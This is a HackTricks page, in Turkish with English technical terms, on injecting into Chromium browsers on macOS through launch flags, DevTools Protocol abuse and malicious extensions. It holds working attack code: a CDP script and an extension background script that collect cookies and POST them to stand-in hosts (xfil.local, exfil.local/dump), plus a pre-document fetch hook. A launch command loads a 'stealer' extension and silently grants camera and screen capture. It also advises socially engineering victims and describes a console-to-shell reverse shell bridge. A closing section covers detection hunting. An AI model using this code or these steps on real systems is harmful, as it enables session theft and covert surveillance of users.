# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi ve Opera gibi Chromium tabanlı browser'ların tümü aynı command-line switch'lerini, preference file'larını ve DevTools automation interface'lerini kullanır. macOS'ta GUI erişimi olan herhangi bir kullanıcı mevcut bir browser session'ını sonlandırabilir ve hedefin entitlement'larıyla çalışan arbitrary flag'ler, extension'lar veya DevTools endpoint'leriyle yeniden açabilir.

#### macOS'ta custom flag'lerle Chromium başlatma

macOS, her Chromium profile'ı için tek bir UI instance'ı tutar; bu nedenle instrumentation genellikle browser'ı force-close etmeyi gerektirir (örneğin `osascript -e 'tell application "Google Chrome" to quit'` ile). Attacker'lar, app bundle'ı değiştirmeden argument inject edebilmek için genellikle `open -na "Google Chrome" --args <flags>` üzerinden yeniden başlatır. Bu command'i bir user LaunchAgent (`~/Library/LaunchAgents/*.plist`) veya login hook içine sarmalamak, değiştirilmiş browser'ın reboot/logoff sonrasında yeniden spawn edilmesini garanti eder.

#### `--load-extension` Flag'i

`--load-extension` flag'i unpacked extension'ları (virgülle ayrılmış path'ler) otomatik olarak yükler. Legitimate extension'ları engellerken yalnızca payload'unuzun çalışmasını zorlamak için bunu `--disable-extensions-except` ile birlikte kullanın. Malicious extension'lar `debugger`, `webRequest` ve `cookies` gibi yüksek etkili permission'lar isteyerek DevTools protocol'lerine pivot edebilir, CSP header'larını patch'leyebilir, HTTPS'i downgrade edebilir veya browser başlar başlamaz session material'ını exfiltrate edebilir.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flag'leri

Bu switch'ler, external tooling'in browser'ı kontrol edebilmesi için Chrome DevTools Protocol'ünü (CDP) TCP veya pipe üzerinden açığa çıkarır. Google, bu interface'in infostealer'lar tarafından yaygın şekilde abuse edildiğini gözlemledi ve Chrome 136'dan (Mart 2025) itibaren browser standard olmayan bir `--user-data-dir` ile başlatılmadıkça switch'ler default profile için ignore edilir. Bu, gerçek profile'larda App-Bound Encryption'ı zorunlu kılar; ancak attacker'lar hâlâ fresh bir profile spawn edebilir, victim'ı bu profile içinde authenticate olmaya zorlayabilir (phishing/triage assistance) ve CDP üzerinden cookie'leri, token'ları, device trust state'lerini veya WebAuthn registration'larını harvest edebilir.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag'i

Bu flag, tüm browser profile'ını (History, Cookies, Login Data, Preference file'ları vb.) attacker-controlled bir path'e yönlendirir. Modern Chrome build'lerini `--remote-debugging-port` ile birleştirirken zorunludur; ayrıca tampered profile'ı izole tutarak security prompt'larını disable eden, extension'ları auto-install eden ve default scheme'leri değiştiren önceden hazırlanmış `Preferences` veya `Secure Preferences` file'larını bırakmanıza olanak tanır.

#### `--use-fake-ui-for-media-stream` Flag'i

Bu switch, camera/mic permission prompt'unu bypass eder; böylece `getUserMedia` çağıran herhangi bir page anında erişim elde eder. Bunu `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` gibi flag'lerle veya CDP `Browser.grantPermissions` command'leriyle birleştirerek audio/video'yu sessizce capture edebilir, desktop share yapabilir veya user interaction olmadan WebRTC permission check'lerini karşılayabilirsiniz.

## Gerçek Ortamda Görülen Delivery ve Relaunch Pattern'leri

CDP abuse genellikle initial payload'dan ziyade bir **post-exploitation** aşamasıdır. macOS developer'larını hedefleyen yakın tarihli bir campaign, code'un victim yalnızca project'i clone ettiğinde veya açtığında değil, **build** ettiğinde çalışması için poisoned bir Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`) kullandı. İlk execution sonrasında malware başka `.xcodeproj` tree'lerini de infect etti, malicious Git `pre-commit` hook'ları ekledi ve daha fazla Xcode project'i için ZIP archive'larını aradı.<sup>[[3]](#references)</sup>

Chromium abuse açısından bunun önemi, attacker'ın browser binary'sini patch'lemesinin gerekmemesidir. Kısa ömürlü bir build-phase / `osascript` stager'ı bunun yerine, kullanıcı her başlattığında legitimate browser'ı attacker-controlled flag'lerle yeniden açan bir **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher vb.) install edebilir.<sup>[[3]](#references)</sup>

> [!TIP]
> Developer endpoint'lerinde `.pbxproj` file'larını, `.git/hooks/pre-commit`'i ve `.xcodeproj` içeren ZIP'leri beklenmeyen `curl`, `osascript`, `xxd`, nested `base64` veya Chrome relaunch logic açısından inceleyin.

## Remote Debugging ve DevTools Protocol Abuse

Chrome dedicated bir `--user-data-dir` ve `--remote-debugging-port` ile yeniden başlatıldıktan sonra CDP üzerinden (örneğin `chrome-remote-interface`, `puppeteer` veya `playwright` aracılığıyla) attach olabilir ve yüksek privilege gerektiren workflow'ları script'leyebilirsiniz:

- **Cookie/session theft:** `Network.getAllCookies` ve `Storage.getCookies`, App-Bound encryption'ın normalde filesystem access'ini engelleyeceği durumlarda bile HttpOnly value'larını döndürür; çünkü CDP çalışan browser'dan bunları decrypt etmesini ister.
- **Permission tampering:** `Browser.grantPermissions` ve `Emulation.setGeolocationOverride`, camera/mic prompt'larını bypass etmenize (özellikle `--use-fake-ui-for-media-stream` ile birleştirildiğinde) veya location-based security check'lerini falsify etmenize olanak tanır.
- **Keystroke/script injection:** `Runtime.evaluate`, active tab içinde arbitrary JavaScript çalıştırarak credential lifting, DOM patching veya navigation sonrasında hayatta kalan persistence beacon'ları inject etmenizi sağlar.<sup>[[1]](#references)</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` ve `Fetch.enable`, disk artifact'larına dokunmadan authenticated request/response'ları real time'da intercept eder.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Chrome 136, varsayılan profilde CDP'yi engellediği için kurbanın mevcut `~/Library/Application Support/Google/Chrome` dizinini bir staging path'e kopyalamak artık şifresi çözülmüş cookies elde edilmesini sağlamaz. Bunun yerine kullanıcıyı instrumented profile içinde kimlik doğrulaması yapması için sosyal mühendislik yoluyla ikna edin (ör. "yardımcı" bir support session) veya CDP kontrollü network hooks aracılığıyla aktarım sırasında MFA tokens yakalayın.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Pratik bir malware pattern'i şöyledir:

1. Chrome her başlatıldığında userland implant'ı veya wrapper'ı yeniden başlatın.
2. Meşru browser'ı `--remote-debugging-port=<port>` ve Chrome 136+ sürümlerinde genellikle buna eşlik eden varsayılan olmayan bir `--user-data-dir=<dir>` ile başlatın.
3. Local CDP WebSocket'e bağlanan ve `Page.addScriptToEvaluateOnNewDocument` ile bir pre-document hook kaydeden bir helper başlatın.<sup>[[2]](#references)</sup>

Bu helper, site kodu çalışmadan **önce** JavaScript enjekte edebilir. Bu da diskteki dosyalara patch uygulamadan `window.fetch`, `XMLHttpRequest`, wallet providers veya autofill flows üzerinde hook oluşturmak için idealdir.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Daha güçlü bir varyant, tarayıcıyı bir **host command bridge** haline getirir: enjekte edilen JavaScript, delimiter-tagged bir `console.log` üretir; yerel yardımcı, `Runtime.consoleAPICalled` olayını izler, işareti kaldırır, kalan kısmı host shell üzerinden (örneğin Go'nun `exec.Command` komutuyla) çalıştırır ve stdout/stderr çıktısını saldırganın WebSocket'i üzerinden geri gönderir. Bu, sekme düzeyindeki script çalıştırmayı büyük ölçüde dosyasız bir reverse shell'e dönüştürür.<sup>[[3]](#references)</sup>

## Extension-Based Injection via Debugger API

2023 tarihli "Chrowned by an Extension" araştırması, `chrome.debugger` API'sini kullanan kötü amaçlı bir extension'ın herhangi bir sekmeye bağlanarak `--remote-debugging-port` ile elde edilen DevTools yetkilerinin aynısına sahip olabildiğini gösterdi.<sup>[[6]](#references)</sup> Bu durum, başlangıçtaki izolasyon varsayımlarını (extension'ların kendi context'lerinde kalması) bozar ve şunları mümkün kılar:

- `Network.getAllCookies`/`Fetch.getResponseBody` ile sessizce cookie ve credential hırsızlığı.
- Site izinlerinin (camera, microphone, geolocation) değiştirilmesi ve security interstitial'larının bypass edilmesi; böylece phishing sayfalarının Chrome dialog'larını taklit etmesine olanak tanınması.
- `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` veya `Security.handleCertificateError` kullanılarak TLS uyarılarının, download'ların veya WebAuthn prompt'larının programatik olarak yönlendirilmesi.

Kullanıcı etkileşimi gerekmemesi için extension'ı `--load-extension`/`--disable-extensions-except` ile yükleyin. API'yi weaponize eden minimal bir background script şu şekildedir:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Uzantı ayrıca JavaScript değişkenlerini okumak, satır içi script'leri patch'lemek veya gezinmeler boyunca kalıcı olan özel breakpoint'ler bırakmak için `Debugger.paused` event'lerine abone olabilir. Her şey kullanıcının GUI session'ı içinde çalıştığından Gatekeeper ve TCC tetiklenmez; bu da bu tekniği kullanıcı context'i altında zaten execution elde etmiş malware için ideal hale getirir.<sup>[[6]](#references)</sup>

## Tespit ve Hunting

- `--remote-debugging-port`, `--remote-debugging-pipe` veya şüpheli bir `--user-data-dir` ile başlatılan Chromium browser'ları, özellikle parent process `bash`, `sh`, `osascript`, `xcodebuild` ya da bir LaunchAgent helper olduğunda alert'leyin.
- Bir helper'ın yerel bir CDP WebSocket'i açtığı, `Page.addScriptToEvaluateOnNewDocument` kaydettiği ve ardından uzun ömürlü bir outbound WebSocket/HTTPS bağlantısı kurduğu kısa process chain'lerini arayın.
- Browser `Runtime.consoleAPICalled` activity'sini attacker tarafından sağlanan command'leri çalıştıran child shell'ler veya helper process'leriyle ilişkilendirerek console-to-shell bridge'lerini araştırın.
- Developer Mac'lerde `.pbxproj` içindeki `PBXShellScriptBuildPhase` entry'lerini, Git `pre-commit` hook'larını, Dock/login item relauncher'larını ve browser wrapper kurulumu için ZIP içinde bulunan Xcode project'lerini inceleyin.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Araçlar

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Chromium başlatmalarını payload extensions ile otomatikleştirir ve etkileşimli CDP hooks sunar.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operatörleri için traffic interception ve browser instrumentation odaklı benzer bir tooling.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Bir `--remote-debugging-port` instance'ı aktif olduğunda Chrome DevTools Protocol dumps'larını (cookies, DOM, permissions) script'lemek için Node.js library.

### Örnek
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Araç bağlantılarında daha fazla örnek bulabilirsiniz.

## Referanslar

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
